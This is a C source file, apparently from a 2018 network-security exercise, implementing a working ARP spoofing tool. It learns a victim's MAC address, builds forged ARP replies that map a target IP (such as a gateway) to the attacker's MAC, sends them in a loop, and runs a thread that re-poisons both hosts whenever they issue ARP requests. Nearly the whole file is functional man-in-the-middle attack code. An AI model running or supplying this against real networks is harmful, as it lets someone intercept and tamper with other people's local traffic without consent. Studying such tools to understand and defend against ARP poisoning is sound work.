/* Copyright © 2018 James Sung. All rights reserved. */

#include "functions.h"


void PRINT_USAGE(void)
{
	printf("[-] Wrong usage!\n");
	printf("[-] syntax: send_arp <interface> <sender ip> <target ip>\n");
	printf("[-] sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
	return;
}

void GET_MY_IP(char *attacker_IP_char, char *interface)
{
	int n;
	struct ifreq ifr;

	n = socket(AF_INET, SOCK_DGRAM, 0);
	
	ifr.ifr_addr.sa_family = AF_INET;
	
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
	ioctl(n, SIOCGIFADDR, &ifr);
	close(n);

	strcpy(attacker_IP_char, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
	return;
}

void PRINT_IP(char *IP_char)
{
	printf("%s", IP_char);
	return;
}

void GET_MY_MAC(uint8_t *attacker_MAC_array, char *interface)
{
	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	
	strcpy(s.ifr_name, interface);
	if (!ioctl(fd, SIOCGIFHWADDR, &s))
	{
		memcpy(attacker_MAC_array, s.ifr_addr.sa_data, 6 * sizeof(uint8_t));
	}

	return;
}

void PRINT_MAC(uint8_t *MAC_array)
{
	for (int i = 0; i < 6; i++)
	{ if (i) printf(":"); printf("%02x", MAC_array[i]); }
	return;
}

void MAKE_ARPREQ_STRUCT(my_etharp_hdr *arp_struct, uint8_t *source_MAC_array, uint32_t source_IP_int, uint32_t destination_IP_int)
{
	memset(arp_struct->DMAC, 0xFF, 6 * sizeof(uint8_t));
	memcpy(arp_struct->SMAC, source_MAC_array, 6 * sizeof(uint8_t));
	arp_struct->ETHTYPE = htons(ETHERTYPE_ARP);

	(arp_struct->ARPHDR).HTYPE = htons(ARPHRD_ETHER);
	(arp_struct->ARPHDR).PTYPE = htons(ETHERTYPE_IP);
	(arp_struct->ARPHDR).HLEN  = ARP_HLEN_ETH;
	(arp_struct->ARPHDR).PLEN  = ARP_PLEN_IP;
	(arp_struct->ARPHDR).OPER  = htons(ARPOP_REQUEST);
	memcpy((arp_struct->ARPHDR).SHA, source_MAC_array, 6 * sizeof(uint8_t));
	(arp_struct->ARPHDR).SPA = source_IP_int;
	memset((arp_struct->ARPHDR).THA, 0x00, 6 * sizeof(uint8_t));
	(arp_struct->ARPHDR).TPA = destination_IP_int;
	
	return;
}

void MAKE_ARPREP_STRUCT(my_etharp_hdr *arp_struct, uint8_t *source_MAC_array, uint8_t *destination_MAC_array, uint32_t destination_IP_int, uint32_t target_IP_int)
{
	memcpy(arp_struct->DMAC, destination_MAC_array, 6 * sizeof(uint8_t));
	memcpy(arp_struct->SMAC, source_MAC_array, 6 * sizeof(uint8_t));
	arp_struct->ETHTYPE = htons(ETHERTYPE_ARP);

	(arp_struct->ARPHDR).HTYPE = htons(ARPHRD_ETHER);
	(arp_struct->ARPHDR).PTYPE = htons(ETHERTYPE_IP);
	(arp_struct->ARPHDR).HLEN  = ARP_HLEN_ETH;
	(arp_struct->ARPHDR).PLEN  = ARP_PLEN_IP;
	(arp_struct->ARPHDR).OPER  = htons(ARPOP_REPLY);
	memcpy((arp_struct->ARPHDR).SHA, source_MAC_array, 6 * sizeof(uint8_t));
	(arp_struct->ARPHDR).SPA = target_IP_int;
	memcpy((arp_struct->ARPHDR).THA, destination_MAC_array, 6 * sizeof(uint8_t));
	(arp_struct->ARPHDR).TPA = destination_IP_int;

	return;
}

bool GET_SENDER_MAC(uint8_t *sender_MAC_array, int sender_IP_int, pcap_t *handle, struct pcap_pkthdr *header, const uint8_t *packet)
{
	time_t start = time(NULL);
	while (1)
	{
		if (time(NULL) > start + 5) { break; }
	
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0)               { continue; }
		if (res == -1 || res == -2) { break; }

		uint16_t PCKT_ETHERTYPE = ntohs(((my_etharp_hdr *)packet)->ETHTYPE);
		if (PCKT_ETHERTYPE != ETHERTYPE_ARP) { continue; }

		uint16_t PCKT_ARPOP = ntohs((((my_etharp_hdr *)packet)->ARPHDR).OPER);
		if (PCKT_ARPOP != ARPOP_REPLY) { continue; }

		uint32_t PCKT_ARPSPA = (((my_etharp_hdr *)packet)->ARPHDR).SPA;
		if (PCKT_ARPSPA != sender_IP_int) { continue; }

		memcpy(sender_MAC_array, (((my_etharp_hdr *)packet)->ARPHDR).SHA, 6 * sizeof(uint8_t));
		
		return 1;
	}

	return 0; 
}

int SEND_ARP(char *dev, char *sender_IP_char, char *target_IP_char, int count)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "[-] Couldn't open device %s: %s\n", dev, errbuf);
		puts("[*] Exiting program with -1");
		return -1;
	}

	char                attacker_IP_char[16];
	struct in_addr     *attacker_IP_struct = (struct in_addr *)calloc(1, sizeof(in_addr));
	uint32_t            attacker_IP_int;
	uint8_t            *attacker_MAC_array = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));

	struct in_addr     *sender_IP_struct = (struct in_addr *)calloc(1, sizeof(struct in_addr));
	uint32_t            sender_IP_int;
	uint8_t            *sender_MAC_array = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));

	struct in_addr     *target_IP_struct = (struct in_addr *)calloc(1, sizeof(in_addr));
	uint32_t            target_IP_int;

	struct pcap_pkthdr *header = (struct pcap_pkthdr *)calloc(1, sizeof(struct pcap_pkthdr));
	const uint8_t      *packet;

	my_etharp_hdr      *arp_request        = (my_etharp_hdr *)calloc(1, sizeof(my_etharp_hdr));
	uint8_t            *arp_request_packet = (uint8_t *)calloc(1, sizeof(my_etharp_hdr));

	my_etharp_hdr      *arp_reply          = (my_etharp_hdr *)calloc(1, sizeof(my_etharp_hdr));
	uint8_t            *arp_reply_packet   = (uint8_t *)calloc(1, sizeof(my_etharp_hdr));	


	inet_aton(target_IP_char, target_IP_struct);
	target_IP_int = target_IP_struct->s_addr;
	
/* get attacker ip address */
	GET_MY_IP(attacker_IP_char, dev);
	printf("[Attacker IP  Address] "); PRINT_IP(attacker_IP_char);
	puts("");
	
	inet_aton(attacker_IP_char, attacker_IP_struct);
	attacker_IP_int = attacker_IP_struct->s_addr;

/* get attacker mac address */
	GET_MY_MAC(attacker_MAC_array, dev);
	printf("[Attacker MAC Address] "); PRINT_MAC(attacker_MAC_array);
	puts(""); puts("");

/* send arp request broadcast */
	printf("[Sender   IP  Address] %s", sender_IP_char);
	puts(""); puts("");

	inet_aton(sender_IP_char, sender_IP_struct);
	sender_IP_int = sender_IP_struct->s_addr;

	printf("[+] Creating ARP request packet: ");
	MAKE_ARPREQ_STRUCT(arp_request, attacker_MAC_array, attacker_IP_int, sender_IP_int);
	puts("Done");

	time_t start = time(NULL);
	while(1)
	{
		if (time(NULL) > start + 5)
		{
			puts("[-] Failed!");
			puts("[*] Exiting program with -1");
			return -1;
		}
		
		printf("[+] Broadcasting ARP request: ");
		if (pcap_sendpacket(handle, (uint8_t *)arp_request, sizeof(my_etharp_hdr)))
		{
			puts("");
			puts("Failed!");
			puts("[-] Failed to send packet");
			puts("[*] Exiting program with -1");
			pcap_perror(handle, 0);	
			return -1;
		}
		puts("Done");

		printf("[+] Getting sender MAC address from ARP reply packet: ");
		if (!GET_SENDER_MAC(sender_MAC_array, sender_IP_int, handle, header, packet))
		{
			puts("");
			puts("[-] Retrying...");
			continue;
		}
		puts("Done"); puts("");
		break;
	}
	
	printf("[Sender   MAC Address] "); PRINT_MAC(sender_MAC_array);
	puts(""); puts("");	

	printf("[+] Creating fake ARP reply packet: ");
	MAKE_ARPREP_STRUCT(arp_reply, attacker_MAC_array, sender_MAC_array, sender_IP_int, target_IP_int);
	puts("Done");	

	puts("[+] Success!");
	printf("[+] Repetitively sending fake ARP reply to sender: sender <%s> will now identify target <%s> MAC as attacker MAC <", sender_IP_char, target_IP_char); PRINT_MAC(attacker_MAC_array); printf(">");
	puts("");

	if (count < 0)
	{
		puts("[+] Sending packets until interrupt...");
		while(1)
		{
			pcap_sendpacket(handle, (uint8_t *)arp_reply, sizeof(my_etharp_hdr));
			puts(".");
			sleep(1);
		}
	}

	else
	{
		printf("[+] %d packets to go!", count); puts("");
		for (int i = 0; i < count; i++)
		{
			pcap_sendpacket(handle, (uint8_t *)arp_reply, sizeof(my_etharp_hdr));
			puts(".");
			sleep(1);
		}
		printf("[+] Sent %d ARP replies!", count); puts("");
	}


	pcap_close(handle);
	free(attacker_IP_struct); free(attacker_MAC_array);
	free(sender_IP_struct);   free(sender_MAC_array);
	free(target_IP_struct);   free(header);
	free(arp_request);        free(arp_request_packet);
	free(arp_reply);          free(arp_reply_packet);

	return 0;
}

void *BLOCK_RECOVERY(void *info)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(((my_args_struct *)info)->dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "[-] Couldn't open device %s: %s\n", ((my_args_struct *)info)->dev, errbuf);
		puts("[*] Exiting program with -1");
		exit(EXIT_FAILURE);
	}	
	
	struct pcap_pkthdr *header = (struct pcap_pkthdr *)calloc(1, sizeof(struct pcap_pkthdr));
	const uint8_t      *packet;
	
	while (1)
	{
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0)               { continue; }
		if (res == -1 || res == -2) { exit(EXIT_FAILURE); }

		uint16_t PCKT_ETHERTYPE = ntohs(((my_etharp_hdr *)packet)->ETHTYPE);
		if (PCKT_ETHERTYPE != ETHERTYPE_ARP) { continue; }

		uint16_t PCKT_ARPOP = ntohs((((my_etharp_hdr *)packet)->ARPHDR).OPER);
		if (PCKT_ARPOP != ARPOP_REQUEST) { continue; }

		uint32_t PCKT_ARPSPA = (((my_etharp_hdr *)packet)->ARPHDR).SPA;
		uint32_t PCKT_ARPTPA = (((my_etharp_hdr *)packet)->ARPHDR).TPA;
		
		if ((PCKT_ARPSPA == ((my_args_struct *)info)->sender_IP_int) && (PCKT_ARPTPA == ((my_args_struct *)info)->target_IP_int))
		{
			pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2sender, sizeof(my_etharp_hdr)); puts("sender <- attacker    target : reinfection");
			continue;
		}

		if ((PCKT_ARPSPA == ((my_args_struct *)info)->target_IP_int) && (PCKT_ARPTPA == ((my_args_struct *)info)->sender_IP_int))
		{
			pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2target, sizeof(my_etharp_hdr)); puts("sender    attacker -> target : reinfection");
			continue;
		}
	}
	free(header);

	return NULL;
}